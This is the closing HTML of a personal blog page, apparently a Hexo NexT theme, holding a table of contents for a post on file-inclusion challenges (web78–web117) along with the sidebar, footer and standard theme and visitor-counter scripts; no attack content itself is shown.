+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web78"><span class="nav-number">1.1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">1.2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80"><span class="nav-number">1.3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81"><span class="nav-number">1.4.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web82-86"><span class="nav-number">1.5.</span> <span class="nav-text">web82-86</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web87"><span class="nav-number">1.6.</span> <span class="nav-text">web87</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web88"><span class="nav-number">1.7.</span> <span class="nav-text">web88</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web116"><span class="nav-number">1.8.</span> <span class="nav-text">web116</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web117"><span class="nav-number">1.9.</span> <span class="nav-text">web117</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="M21in"
+      src="/images/blog_head.jpg#/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">M21in</p>
+  <div class="site-description" itemprop="description">用来记录生活和技术的地方</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=483937795&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">M21in</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+<!-- 代码块复制功能 -->
+<script type="text/javascript" src="/js/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/clipboard-use.js"></script>
